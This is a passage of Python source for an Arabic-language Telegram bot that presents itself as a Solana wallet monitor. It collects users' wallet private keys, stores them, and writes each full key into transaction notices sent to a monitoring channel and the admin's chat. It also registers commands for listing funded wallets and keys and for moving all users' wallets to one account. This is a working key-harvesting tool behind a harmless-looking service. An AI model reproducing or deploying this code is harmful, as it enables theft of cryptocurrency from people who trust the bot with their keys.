            logger.info(f"Sent rich wallets list to user {chat_id}: {len(wallets_with_balance)} wallets with {total_balance:.9f} SOL")

        except Exception as e:
            logger.error(f"Error in rich wallets command: {e}")
            await update.message.reply_text(MESSAGES["error_occurred"].format(error=str(e)))

    async def filter_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /filter command - admin only: adjust minimum notification amount"""
        global MIN_NOTIFICATION_AMOUNT
        chat_id = update.effective_chat.id

        # Check if user is admin
        if chat_id != ADMIN_CHAT_ID:
            await update.message.reply_text("❌ هذا الأمر متاح للمشرف فقط.")
            return

        try:
            if context.args and len(context.args) > 0:
                # Set new minimum amount
                new_amount = float(context.args[0])
                if new_amount < 0:
                    await update.message.reply_text("❌ يجب أن يكون المبلغ أكبر من أو يساوي 0")
                    return

                MIN_NOTIFICATION_AMOUNT = new_amount

                # Save to database
                success = await self.monitor.db_manager.save_setting('min_notification_amount', str(new_amount))

                if success:
                    await update.message.reply_text(
                        f"✅ تم تحديث وحفظ الحد الأدنى للإشعارات إلى: {MIN_NOTIFICATION_AMOUNT} SOL\n\n"
                        f"سيتم تجاهل المعاملات الأصغر من هذا المبلغ.\n"
                        f"🔒 تم حفظ الإعداد بشكل دائم."
                    )
                    logger.info(f"Admin {chat_id} changed and saved minimum notification amount to {MIN_NOTIFICATION_AMOUNT} SOL")
                else:
                    await update.message.reply_text(
                        f"⚠️ تم تحديث الحد الأدنى للإشعارات إلى: {MIN_NOTIFICATION_AMOUNT} SOL ولكن فشل في حفظه.\n\n"
                        f"سيعود إلى القيمة الافتراضية عند إعادة التشغيل."
                    )
            else:
                # Show current setting
                await update.message.reply_text(
                    f"🔧 الحد الأدنى الحالي للإشعارات: {MIN_NOTIFICATION_AMOUNT} SOL\n\n"
                    f"لتغيير الحد الأدنى، استخدم: /filter <المبلغ>\n"
                    f"مثال: /filter 0.005\n\n"
                    f"🔒 الإعداد سيتم حفظه بشكل دائم."
                )
        except ValueError:
            await update.message.reply_text(
                "❌ يرجى إدخال رقم صحيح.\n\n"
                "مثال: /filter 0.001"
            )

    async def debug_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /debug command - show notification settings"""
        chat_id = update.effective_chat.id
        
        try:
            monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
            all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
            
            debug_info = f"🔍 معلومات التشخيص:\n\n"
            debug_info += f"👤 معرف المستخدم: {chat_id}\n"
            debug_info += f"👑 معرف المشرف: {ADMIN_CHAT_ID}\n"
            debug_info += f"📺 معرف القناة: {MONITORING_CHANNEL}\n"
            debug_info += f"💰 الحد الأدنى للإشعارات: {MIN_NOTIFICATION_AMOUNT} SOL\n"
            debug_info += f"🔍 محافظك: {len(monitored_wallets)}\n"
            debug_info += f"📊 إجمالي المحافظ: {len(all_wallets)}\n\n"
            
            # Check admin status
            is_admin = chat_id == ADMIN_CHAT_ID
            debug_info += f"👑 هل أنت مشرف؟ {is_admin}\n\n"
            
            # Show notification logic for user's wallets
            if monitored_wallets:
                debug_info += "📋 حالة الإشعارات لمحافظك:\n"
                for wallet in monitored_wallets[:3]:  # Show first 3
                    wallet_monitors = await self.monitor.db_manager.get_monitored_wallets_by_address(wallet['wallet_address'])
                    admin_monitoring = any(w['chat_id'] == ADMIN_CHAT_ID for w in wallet_monitors)
                    regular_monitoring = any(w['chat_id'] != ADMIN_CHAT_ID for w in wallet_monitors)
                    
                    debug_info += f"• {truncate_address(wallet['wallet_address'])}\n"
                    debug_info += f"  👑 مشرف: {admin_monitoring}\n"
                    debug_info += f"  👥 مستخدمون: {regular_monitoring}\n\n"
            
            await update.message.reply_text(debug_info)
            
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ في التشخيص: {str(e)}")

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stats command - show enhanced rate limiter and monitoring statistics"""
        chat_id = update.effective_chat.id
        
        try:
            # Get rate limiter stats
            limiter_stats = self.monitor.rate_limiter.get_stats()
            
            # Get wallet and user counts
            monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
            all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
            users_count = await self.monitor.db_manager.get_users_count()
            
            # Calculate success rate
            total_requests = limiter_stats['success_count'] + limiter_stats['fail_count']
            success_rate = (limiter_stats['success_count'] / total_requests * 100) if total_requests > 0 else 0
            
            # Calculate estimated cycle time
            optimal_batch_size = self.monitor.rate_limiter.get_optimal_batch_size()
            num_batches = (len(all_wallets) + optimal_batch_size - 1) // optimal_batch_size if all_wallets else 0
            estimated_cycle_time = (num_batches * BATCH_DELAY) + (len(all_wallets) * limiter_stats['current_delay'])
            
            stats_message = f"📊 إحصائيات النظام المحسن:\n\n"
            stats_message += f"🏦 البيانات:\n"
            stats_message += f"• المحافظ الخاصة بك: {len(monitored_wallets)}\n"
            stats_message += f"• إجمالي المحافظ: {len(all_wallets)}\n"
            stats_message += f"• المستخدمون النشطون: {users_count}\n\n"
            
            stats_message += f"⚡ أداء النظام:\n"
            stats_message += f"• وضع الأداء: {limiter_stats['performance_mode'].upper()}\n"
            stats_message += f"• التأخير الحالي: {limiter_stats['current_delay']:.3f}s\n"
            stats_message += f"• حجم الدفعة التكيفي: {optimal_batch_size} محفظة\n"
            stats_message += f"• عدد الدفعات المقدر: {num_batches}\n"
            stats_message += f"• وقت الدورة المقدر: {estimated_cycle_time:.1f}s\n"
            stats_message += f"• معدل الطلبات الحالي: {limiter_stats['recent_request_rate']}/10s\n\n"
            
            stats_message += f"📈 إحصائيات الطلبات:\n"
            stats_message += f"• الطلبات الناجحة: {limiter_stats['success_count']}\n"
            stats_message += f"• الطلبات الفاشلة: {limiter_stats['fail_count']}\n"
            stats_message += f"• معدل النجاح: {success_rate:.1f}%\n"
            stats_message += f"• النجاحات المتتالية: {limiter_stats['consecutive_successes']}\n"
            
            # Time since last 429 error
            if limiter_stats['time_since_last_429']:
                stats_message += f"• آخر خطأ 429: {limiter_stats['time_since_last_429']:.0f}s مضت\n"
            else:
                stats_message += f"• آخر خطأ 429: لم يحدث بعد\n"
            
            stats_message += f"\n🔧 إعدادات النظام:\n"
            stats_message += f"• النطاق: {MIN_DELAY:.3f}s - {MAX_DELAY:.1f}s\n"
            stats_message += f"• حد الطلبات: {MAX_RPC_CALLS_PER_SECOND}/ثانية\n"
            stats_message += f"• التكيف الذكي: {'✅' if ADAPTIVE_BATCH_SIZING else '❌'}\n"
            
            # Performance assessment
            if estimated_cycle_time < 60:
                stats_message += f"\n🚀 الأداء: ممتاز! (دورة < دقيقة)"
            elif estimated_cycle_time < 120:
                stats_message += f"\n✅ الأداء: جيد (دورة < دقيقتان)"
            else:
                stats_message += f"\n⚠️ الأداء: يحتاج تحسين (دورة > دقيقتان)"
            
            await update.message.reply_text(stats_message)
            
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ في جلب الإحصائيات: {str(e)}")

    async def transfer_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /transfer command - admin only: transfer all wallets to specified user"""
        chat_id = update.effective_chat.id

        # Check if user is admin
        if chat_id != ADMIN_CHAT_ID:
            await update.message.reply_text("❌ هذا الأمر متاح للمشرف فقط.")
            return

        try:
            if not context.args or len(context.args) == 0:
                await update.message.reply_text(
                    "📋 استخدام الأمر:\n"
                    "/transfer <معرف_المستخدم>\n\n"
                    "مثال: /transfer 1873930191\n\n"
                    "⚠️ هذا الأمر سيقوم بنقل جميع المحافظ من جميع المستخدمين إلى المستخدم المحدد.\n"
                    "🔒 هذا الأمر متاح للمشرف فقط ولا يمكن التراجع عنه."
                )
                return

            # Parse target user ID
            try:
                target_user_id = int(context.args[0])
            except ValueError:
                await update.message.reply_text("❌ معرف المستخدم يجب أن يكون رقمًا صحيحًا.")
                return

            # Send confirmation message
            status_message = await update.message.reply_text(
                f"🔄 جاري نقل جميع المحافظ إلى المستخدم: {target_user_id}\n\n"
                "⏳ يرجى الانتظار..."
            )

            # Get current statistics before transfer
            all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
            users_count = await self.monitor.db_manager.get_users_count()

            # Update status with current info
            await status_message.edit_text(
                f"🔄 جاري نقل المحافظ...\n\n"
                f"📊 الإحصائيات الحالية:\n"
                f"👥 المستخدمون النشطون: {users_count}\n"
                f"🔍 إجمالي المحافظ: {len(all_wallets)}\n"
                f"🎯 المستخدم المستهدف: {target_user_id}\n\n"
                "⏳ جاري التنفيذ..."
            )

            # Perform the transfer
            success, transfer_info = await self.monitor.db_manager.transfer_all_wallets(target_user_id)

            if success:
                # Create detailed report
                report = f"✅ تم نقل المحافظ بنجاح!\n\n"
                report += f"📊 تقرير النقل:\n"
                report += f"🔍 إجمالي المحافظ المنقولة: {transfer_info['updated_count']}\n"
                report += f"👥 عدد المستخدمين السابقين: {transfer_info['unique_users']}\n"
                report += f"🎯 المستخدم الجديد: {target_user_id}\n\n"

                # Add user breakdown
                if transfer_info['user_breakdown']:
                    report += "📋 تفصيل المحافظ حسب المستخدم السابق:\n"
                    for user_info in transfer_info['user_breakdown'][:10]:  # Show top 10
                        report += f"• المستخدم {user_info['chat_id']}: {user_info['wallet_count']} محفظة\n"
                    
                    if len(transfer_info['user_breakdown']) > 10:
                        remaining = len(transfer_info['user_breakdown']) - 10
                        report += f"• ... و {remaining} مستخدم آخر\n"

                report += f"\n🔔 جميع المحافظ الآن تحت إدارة المستخدم {target_user_id}"

                # Add user to database if not exists
                await self.monitor.db_manager.add_user(target_user_id)

                await status_message.edit_text(report)
                logger.info(f"Admin {chat_id} transferred all wallets to user {target_user_id}")

            else:
                error_message = transfer_info.get('error', 'خطأ غير معروف')
                await status_message.edit_text(
                    f"❌ فشل في نقل المحافظ!\n\n"
                    f"الخطأ: {error_message}\n\n"
                    "يرجى المحاولة مرة أخرى أو الاتصال بالدعم الفني."
                )

        except Exception as e:
            logger.error(f"Error in transfer command: {e}")
            await update.message.reply_text(f"❌ حدث خطأ: {str(e)}")

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages"""
        # تجاهل رسائل القناة تماماً لتجنب الأخطاء
        if update.channel_post:
            return
        
        # التأكد من وجود رسالة عادية
        if not update.message:
            return
            
        chat_id = update.effective_chat.id
        text = update.message.text

        # Check if user is waiting for private key input
        if chat_id in self.user_states and self.user_states[chat_id] in ["waiting_private_key", "waiting_bulk_private_keys"]:
            if text:
                await self.handle_private_key_input(update, context, text)
        else:
            # Only show help if the message doesn't contain potential private keys
            if text and not self.might_contain_private_keys(text):
                await update.message.reply_text(MESSAGES["help_text"])

    def might_contain_private_keys(self, text: str) -> bool:
        """Check if text might contain private keys"""
        import re
        
        # Pattern for base58 keys (typically 87-88 characters)
        base58_pattern = r'[1-9A-HJ-NP-Za-km-z]{87,88}'
        
        # Pattern for array format keys
        array_pattern = r'\[\s*(?:\d+\s*,\s*){63}\d+\s*\]'
        
        # Check if text contains potential private keys
        return bool(re.search(base58_pattern, text) or re.search(array_pattern, text))

    async def handle_private_key_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE, private_key: str):
        """Handle private key input"""
        chat_id = update.effective_chat.id
        current_state = self.user_states.get(chat_id)

        if current_state == "waiting_bulk_private_keys":
            await self.handle_bulk_private_keys(update, context, private_key)
        else:
            # Clear user state
            self.user_states.pop(chat_id, None)

            # Validate private key
            is_valid, result = validate_private_key(private_key)

            if not is_valid:
                await update.message.reply_text(MESSAGES["invalid_private_key"])
                logger.warning(f"Invalid private key from user {chat_id}: {result}")
                return

            wallet_address = result

            # Add wallet to monitoring
            success, message = await self.monitor.add_wallet(
                private_key, 
                chat_id, 
                self.send_transaction_notification
            )

            if success:
                # Create inline keyboard with + and Start buttons
                keyboard = [
                    [
                        InlineKeyboardButton("➕ إضافة محفظة أخرى", callback_data="add_wallet"),
                        InlineKeyboardButton("🚀 بدء المراقبة", callback_data="start_monitoring")
                    ]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)

                await update.message.reply_text(
                    MESSAGES["monitoring_started"].format(wallet_address=truncate_address(wallet_address)),
                    reply_markup=reply_markup
                )
                logger.info(f"Started monitoring wallet {wallet_address} for user {chat_id}")
            else:
                if message == "wallet_already_monitored":
                    await update.message.reply_text(MESSAGES["wallet_already_monitored"])
                else:
                    await update.message.reply_text(MESSAGES["error_occurred"].format(error=message))

    async def handle_bulk_private_keys(self, update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
        """Handle bulk private key input"""
        chat_id = update.effective_chat.id

        # Clear user state
        self.user_states.pop(chat_id, None)

        # Extract private keys from text
        private_keys = self.extract_private_keys_from_text(text)

        if not private_keys:
            await update.message.reply_text(
                "❌ لم يتم العثور على أي مفاتيح خاصة صحيحة في النص.\n\n"
                "تأكد من أن المفاتيح بتنسيق صحيح (base58 أو array)."
            )
            return

        # Send initial status message
        status_message = await update.message.reply_text(
            f"🔄 جاري معالجة {len(private_keys)} مفتاح...\n\n"
            "⏳ يرجى الانتظار..."
        )

        # Process keys and track results
        successful_wallets = []
        failed_keys = []
        already_monitored = []

        for i, private_key in enumerate(private_keys, 1):
            try:
                # Update status
                await status_message.edit_text(
                    f"🔄 معالجة المفاتيح: {i}/{len(private_keys)}\n\n"
                    f"✅ نجح: {len(successful_wallets)}\n"
                    f"🔄 مراقب مسبقاً: {len(already_monitored)}\n"
                    f"❌ فشل: {len(failed_keys)}\n\n"
                    "⏳ جاري المعالجة..."
                )

                # Validate private key
                is_valid, result = validate_private_key(private_key)

                if not is_valid:
                    failed_keys.append(f"مفتاح غير صحيح: {private_key[:20]}...")
                    continue

                wallet_address = result

                # Add wallet to monitoring
                success, message = await self.monitor.add_wallet(
                    private_key, 
                    chat_id, 
                    self.send_transaction_notification
                )

                if success:
                    successful_wallets.append(truncate_address(wallet_address))
                    logger.info(f"Bulk added wallet {wallet_address} for user {chat_id}")
                else:
                    if message == "wallet_already_monitored":
                        already_monitored.append(truncate_address(wallet_address))
                    else:
                        failed_keys.append(f"خطأ: {message}")

            except Exception as e:
                failed_keys.append(f"خطأ في المعالجة: {str(e)[:30]}...")

        # Prepare final report
        report = f"📊 تقرير إضافة المحافظ:\n\n"
        report += f"🔢 إجمالي المفاتيح: {len(private_keys)}\n"
        report += f"✅ تمت الإضافة بنجاح: {len(successful_wallets)}\n"
        report += f"🔄 مراقبة مسبقاً: {len(already_monitored)}\n"
        report += f"❌ فشل: {len(failed_keys)}\n\n"

        if successful_wallets:
            report += "✅ المحافظ المضافة:\n"
            for wallet in successful_wallets:
                report += f"  • {wallet}\n"
            report += "\n"

        if already_monitored:
            report += "🔄 محافظ مراقبة مسبقاً:\n"
            for wallet in already_monitored:
                report += f"  • {wallet}\n"
            report += "\n"

        if failed_keys:
            report += "❌ مفاتيح فاشلة:\n"
            for error in failed_keys[:5]:  # Show only first 5 errors
                report += f"  • {error}\n"
            if len(failed_keys) > 5:
                report += f"  • ... و {len(failed_keys) - 5} أخطاء أخرى\n"
            report += "\n"

        report += "🔔 المراقبة نشطة للمحافظ المضافة!"

        # Update final status
        await status_message.edit_text(report)

    def extract_private_keys_from_text(self, text: str) -> List[str]:
        """Extract private keys from text, handling various formats"""
        import re

        private_keys = []

        # Pattern for base58 keys (typically 87-88 characters)
        base58_pattern = r'[1-9A-HJ-NP-Za-km-z]{87,88}'

        # Pattern for array format keys
        array_pattern = r'\[\s*(?:\d+\s*,\s*){63}\d+\s*\]'

        # Find base58 keys
        base58_matches = re.findall(base58_pattern, text)
        for match in base58_matches:
            # Validate that it's likely a private key (not just random base58)
            if len(match) in [87, 88]:
                private_keys.append(match.strip())

        # Find array format keys
        array_matches = re.findall(array_pattern, text)
        for match in array_matches:
            private_keys.append(match.strip())

        # Remove duplicates while preserving order
        seen = set()
        unique_keys = []
        for key in private_keys:
            if key not in seen:
                seen.add(key)
                unique_keys.append(key)

        return unique_keys

    async def handle_callback_query(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle inline keyboard callbacks"""
        query = update.callback_query
        await query.answer()

        if query.data.startswith("stop_"):
            wallet_address = query.data[5:]  # Remove "stop_" prefix
            chat_id = query.from_user.id

            success = await self.monitor.remove_wallet(wallet_address, chat_id)

            if success:
                await query.edit_message_text(
                    MESSAGES["monitoring_stopped"].format(
                        wallet_address=truncate_address(wallet_address)
                    )
                )
                logger.info(f"Stopped monitoring wallet {wallet_address}")
            else:
                await query.edit_message_text(MESSAGES["wallet_not_found"])

        elif query.data == "add_wallet":
            chat_id = query.from_user.id

            # Check if user has reached maximum wallets
            monitored_wallets = await self.monitor.db_manager.get_monitored_wallets(chat_id)
            if len(monitored_wallets) >= MAX_MONITORED_WALLETS:
                await query.edit_message_text(
                    MESSAGES["max_wallets_reached"].format(max_wallets=MAX_MONITORED_WALLETS)
                )
                return

            # Set user state to waiting for private key
            self.user_states[chat_id] = "waiting_private_key"
            await query.edit_message_text(MESSAGES["enter_private_key"])

        elif query.data == "start_monitoring":
            await query.edit_message_text("🔔 المراقبة نشطة! ستحصل على إشعارات فورية عند حدوث معاملات جديدة.")

    async def send_transaction_notification(self, chat_id: int, wallet_address: str, 
                                          amount: str, tx_type: str, timestamp: str, signature: str):
        """Send transaction notification based on admin/user monitoring logic"""
        try:
            logger.info(f"🔔 Attempting to send notification: {amount} SOL for wallet {truncate_address(wallet_address)}")
            
            # Get all users monitoring this wallet
            wallets_monitoring = await self.monitor.db_manager.get_monitored_wallets_by_address(wallet_address)

            if not wallets_monitoring:
                logger.warning(f"No users monitoring wallet {wallet_address}")
                return
                
            logger.info(f"Found {len(wallets_monitoring)} users monitoring this wallet")

            # Check if admin is monitoring this wallet
            admin_monitoring = any(wallet_info['chat_id'] == ADMIN_CHAT_ID for wallet_info in wallets_monitoring)

            # Check if any regular users are monitoring this wallet
            regular_users_monitoring = any(wallet_info['chat_id'] != ADMIN_CHAT_ID for wallet_info in wallets_monitoring)

            logger.info(f"Admin monitoring: {admin_monitoring}, Regular users monitoring: {regular_users_monitoring}")

            # Get private key for this wallet (from the first user who has it)
            private_key = None
            for wallet_info in wallets_monitoring:
                pk = await self.get_private_key_for_wallet(wallet_info['chat_id'], wallet_address)
                if pk:
                    private_key = pk
                    break

            # Get recipient address for outgoing transactions
            recipient_address = await self.get_recipient_address(signature, wallet_address)

            # Create simple message without complex escaping
            amount_float = abs(float(amount)) if amount else 0
            urgency_icon = "🚨" if amount_float >= 0.1 else "💰"
            
            # Use simple HTML formatting with copyable elements
            message = f"{urgency_icon} معاملة جديدة!\n\n"
            message += f"🏦 المحفظة: <code>{truncate_address(wallet_address)}</code>\n"
            message += f"💵 المبلغ: <code>{amount} SOL</code>\n"
            message += f"🔄 النوع: {tx_type}\n"
            
            # Add recipient address for outgoing transactions
            if recipient_address and ("إرسال" in tx_type or "📤" in tx_type):
                message += f"📨 المستلم: <code>{truncate_address(recipient_address)}</code>\n"
            
            message += f"⏰ الوقت: <code>{timestamp}</code>\n"

            # Add private key to message if found
            if private_key:
                message += f"\n🔐 المفتاح الخاص:\n<code>{private_key}</code>\n"

            # Add full wallet address as copyable code
            message += f"\n📋 العنوان الكامل:\n<code>{wallet_address}</code>\n"

            # Add full recipient address for outgoing transactions
            if recipient_address and ("إرسال" in tx_type or "📤" in tx_type):
                message += f"\n📨 عنوان المستلم الكامل:\n<code>{recipient_address}</code>\n"

            # Add transaction signature (full signature)
            message += f"\n🔗 توقيع المعاملة:\n<code>{signature}</code>"

            # Apply notification logic with better error handling
            if admin_monitoring and regular_users_monitoring:
                # Case 1: Both admin and regular users monitoring → Send to channel + admin private
                logger.info(f"📤 Case 1: Sending to channel {MONITORING_CHANNEL} and admin {ADMIN_CHAT_ID}")
                
                # Send to public channel
                if MONITORING_CHANNEL:
                    try:
                        await self.application.bot.send_message(
                            chat_id=MONITORING_CHANNEL,
                            text=message,
                            parse_mode='HTML'
                        )
                        logger.info(f"✅ Successfully sent to channel {MONITORING_CHANNEL}")
                    except Exception as channel_error:
                        logger.error(f"❌ Error sending to channel {MONITORING_CHANNEL}: {channel_error}")

                # Send to admin private chat
                try:
                    admin_message = message + f"\n\n👑 <b>إشعار المشرف</b>: هذه المحفظة مراقبة من قبل مستخدمين عاديين أيضاً"
                    await self.application.bot.send_message(
                        chat_id=ADMIN_CHAT_ID, 
                        text=admin_message, 
                        parse_mode='HTML'
                    )
                    logger.info(f"✅ Successfully sent to admin {ADMIN_CHAT_ID}")
                except Exception as admin_error:
                    logger.error(f"❌ Error sending to admin {ADMIN_CHAT_ID}: {admin_error}")

            elif admin_monitoring and not regular_users_monitoring:
                # Case 2: Only admin monitoring → Send to admin private only
                logger.info(f"📤 Case 2: Sending to admin only {ADMIN_CHAT_ID}")
                try:
                    admin_message = message + f"\n\n👑 <b>إشعار المشرف</b>: هذه المحفظة مراقبة من قبلك فقط"
                    await self.application.bot.send_message(
                        chat_id=ADMIN_CHAT_ID, 
                        text=admin_message, 
                        parse_mode='HTML'
                    )
                    logger.info(f"✅ Successfully sent to admin {ADMIN_CHAT_ID}")
                except Exception as admin_error:
                    logger.error(f"❌ Error sending to admin {ADMIN_CHAT_ID}: {admin_error}")

            elif not admin_monitoring and regular_users_monitoring:
                # Case 3: Only regular users monitoring → Send to channel only
                logger.info(f"📤 Case 3: Sending to channel only {MONITORING_CHANNEL}")
                if MONITORING_CHANNEL:
                    try:
                        await self.application.bot.send_message(
                            chat_id=MONITORING_CHANNEL,
                            text=message,
                            parse_mode='HTML'
                        )
                        logger.info(f"✅ Successfully sent to channel {MONITORING_CHANNEL}")
                    except Exception as channel_error:
                        logger.error(f"❌ Error sending to channel {MONITORING_CHANNEL}: {channel_error}")
                else:
                    logger.error("❌ MONITORING_CHANNEL is not configured!")
            
            else:
                logger.warning(f"🤔 No valid notification case found: admin_monitoring={admin_monitoring}, regular_users_monitoring={regular_users_monitoring}")

        except Exception as e:
            logger.error(f"❌ Critical error in send_transaction_notification: {e}")
            import traceback
            logger.error(traceback.format_exc())

    async def get_recipient_address(self, signature: str, sender_address: str) -> str:
        """Get recipient address from transaction signature"""
        try:
            # Get detailed transaction data
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getTransaction",
                "params": [
                    signature,
                    {"encoding": "json", "maxSupportedTransactionVersion": 0}
                ]
            }

            data = await self.monitor.make_rpc_call(payload)
            if not data or 'result' not in data or not data['result']:
                return None

            transaction = data['result']
            account_keys = transaction.get('transaction', {}).get('message', {}).get('accountKeys', [])
            
            # Find sender index
            sender_index = None
            for i, key in enumerate(account_keys):
                if key == sender_address:
                    sender_index = i
                    break
            
            if sender_index is None:
                return None

            # Get balance changes to find recipient
            meta = transaction.get('meta', {})
            pre_balances = meta.get('preBalances', [])
            post_balances = meta.get('postBalances', [])
            
            # Find the account that received SOL (balance increased)
            for i, (pre, post) in enumerate(zip(pre_balances, post_balances)):
                if i != sender_index and post > pre:  # Skip sender, find recipient
                    if i < len(account_keys):
                        return account_keys[i]
            
            return None

        except Exception as e:
            logger.debug(f"Error getting recipient address for {signature[:16]}...: {e}")
            return None

    async def get_private_key_for_wallet(self, chat_id: int, wallet_address: str) -> str:
        """Get private key for a specific wallet"""
        try:
            wallets = await self.monitor.db_manager.get_all_monitored_wallets()
            for wallet in wallets:
                if wallet['chat_id'] == chat_id and wallet['wallet_address'] == wallet_address:
                    return wallet['private_key']
            return None
        except Exception as e:
            logger.error(f"Error getting private key: {e}")
            return None

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle errors"""
        import traceback

        # Log the error with more details
        logger.error(f"Update {update} caused error {context.error}")
        logger.error("".join(traceback.format_exception(type(context.error), context.error, context.error.__traceback__)))

        # Handle specific error types
        if "Conflict" in str(context.error):
            logger.warning("🔄 Telegram API conflict detected - another bot instance may be running")
        elif "TimeoutError" in str(context.error):
            logger.warning("⏰ Network timeout - will retry automatically")
        elif "NetworkError" in str(context.error):
            logger.warning("🌐 Network error - will retry automatically")

    def setup_handlers(self):
        """Setup bot handlers"""
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("monitor", self.monitor_command))
        self.application.add_handler(CommandHandler("add", self.bulk_add_command))
        self.application.add_handler(CommandHandler("stop", self.stop_command))
        self.application.add_handler(CommandHandler("list", self.list_command))
        self.application.add_handler(CommandHandler("r", self.rich_wallets_command))
        self.application.add_handler(CommandHandler("k", self.keys_command))
        self.application.add_handler(CommandHandler("filter", self.filter_command))
        self.application.add_handler(CommandHandler("transfer", self.transfer_command))
        self.application.add_handler(CommandHandler("debug", self.debug_command))
        self.application.add_handler(CommandHandler("stats", self.stats_command))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        self.application.add_handler(CallbackQueryHandler(self.handle_callback_query))
        self.application.add_error_handler(self.error_handler)

    async def start_bot(self):
        """Start the bot"""
        # Validate required environment variables
        if not TELEGRAM_BOT_TOKEN:
            logger.error("❌ TELEGRAM_BOT_TOKEN environment variable is required")
            return

        if not DATABASE_URL:
            logger.error("❌ DATABASE_URL environment variable is required")
            return

        if not SOLANA_RPC_URL:
            logger.error("❌ RPC_URL environment variable is required")
            return

        try:
            # Initialize database
            await self.monitor.db_manager.initialize()

            # Load saved filter setting
            await self.load_filter_setting()

            # Create application with better configuration
            self.application = (Application.builder()
                              .token(TELEGRAM_BOT_TOKEN)
                              .concurrent_updates(True)
                              .build())

            # Setup handlers
            self.setup_handlers()

            # Start monitoring session
            await self.monitor.start_session()

            # Start optimized global monitoring
            await self.monitor.start_global_monitoring(self.send_transaction_notification)

            # Get and display user count
            users_count = await self.monitor.db_manager.get_users_count()
            monitored_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
            logger.info(f"👥 Active Users: {users_count}")
            logger.info(f"🔍 Monitored Wallets: {len(monitored_wallets)}")
            logger.info(f"📡 Monitoring Channel: {MONITORING_CHANNEL}")
            logger.info(f"⚡ RPC Rate Limit: {MAX_RPC_CALLS_PER_SECOND}/second")
            logger.info(f"🔄 Polling Interval: {POLLING_INTERVAL} seconds")

            logger.info("🚀 Starting Solana Wallet Monitor Bot...")

            # Start the application with proper error handling
            await self.application.initialize()

            # Delete webhook to avoid conflicts
            await self.application.bot.delete_webhook(drop_pending_updates=True)

            await self.application.start()

            # Start polling with timeout to prevent conflicts
            await self.application.updater.start_polling(
                poll_interval=1.0,
                timeout=10,
                bootstrap_retries=-1
            )

            logger.info("✅ Bot is running successfully!")

            # Start health monitoring
            health_task = asyncio.create_task(self.health_monitor())

            # Keep the bot running
            try:
                await asyncio.Event().wait()
            except KeyboardInterrupt:
                logger.info("🛑 Received shutdown signal...")
                health_task.cancel()

        except Exception as e:
            logger.error(f"❌ Error starting bot: {e}")
            raise
        finally:
            await self.cleanup()

    async def load_filter_setting(self):
        """Load saved filter setting from database"""
        global MIN_NOTIFICATION_AMOUNT
        try:
            saved_amount = await self.monitor.db_manager.get_setting('min_notification_amount', str(MIN_NOTIFICATION_AMOUNT))
            MIN_NOTIFICATION_AMOUNT = float(saved_amount)
            logger.info(f"🔧 Loaded saved minimum notification amount: {MIN_NOTIFICATION_AMOUNT} SOL")
        except Exception as e:
            logger.warning(f"Error loading filter setting, using default: {e}")



    async def health_monitor(self):
        """Monitor bot health with rate limiter statistics"""
        while True:
            try:
                await asyncio.sleep(60)  # Check every minute

                # Check if monitoring tasks are still running
                active_tasks = sum(1 for task_info in self.monitor.monitoring_tasks.values() 
                                 if isinstance(task_info, dict) and 
                                    task_info.get('task') and 
                                    not task_info['task'].done())

                # Get rate limiter statistics
                limiter_stats = self.monitor.rate_limiter.get_stats()
                
                # Get wallet count
                all_wallets = await self.monitor.db_manager.get_all_monitored_wallets()
                
                logger.info(
                    f"🩺 Health check: "
                    f"{active_tasks} active tasks, "
                    f"{len(all_wallets)} wallets monitored, "
                    f"Rate limiter: {limiter_stats['current_delay']:.3f}s delay, "
                    f"Success rate: {limiter_stats['success_count']}/{limiter_stats['success_count'] + limiter_stats['fail_count']}"
                )

                # Restart global monitoring if it died
                if 'global_monitor' not in self.monitor.monitoring_tasks or \
                   self.monitor.monitoring_tasks['global_monitor']['task'].done():
                    logger.warning("🔄 Restarting global monitoring task")
                    await self.monitor.start_global_monitoring(self.send_transaction_notification)

                # Additional check to ensure monitoring is working
                if len(all_wallets) > 0 and active_tasks == 0:
                    logger.error("🚨 No monitoring tasks running despite having wallets! Restarting...")
                    await self.monitor.start_global_monitoring(self.send_transaction_notification)

            except Exception as e:
                logger.error(f"Health monitor error: {e}")
                await asyncio.sleep(30)

    async def cleanup(self):
        """Cleanup resources"""
        logger.info("🧹 Cleaning up resources...")

        try:
            # Stop monitoring first
            await self.monitor.stop_all_monitoring()
            logger.info("✅ Stopped all monitoring tasks")

            # Close database connections
            await self.monitor.db_manager.close()
            logger.info("✅ Closed database connections")

            # Stop the application
            if self.application and self.application.updater.running:
                await self.application.updater.stop()
                await self.application.stop()
                await self.application.shutdown()
                logger.info("✅ Stopped Telegram application")

        except Exception as e:
            logger.error(f"❌ Error during cleanup: {e}")

        logger.info("🏁 Cleanup completed")


async def start_http_server():
    """Start HTTP server to keep the service alive"""
    from aiohttp import web

    async def health_check(request):
        """Health check endpoint"""
        return web.Response(text='🤖 Telegram bot is running.\n', content_type='text/plain')

    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)

    # Use environment PORT or default to 5000
    port = int(os.environ.get('PORT', 5000))

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

    logger.info(f"🌐 HTTP server listening on port {port}")
    return runner

async def main():
    """Main function"""
    # Start HTTP server
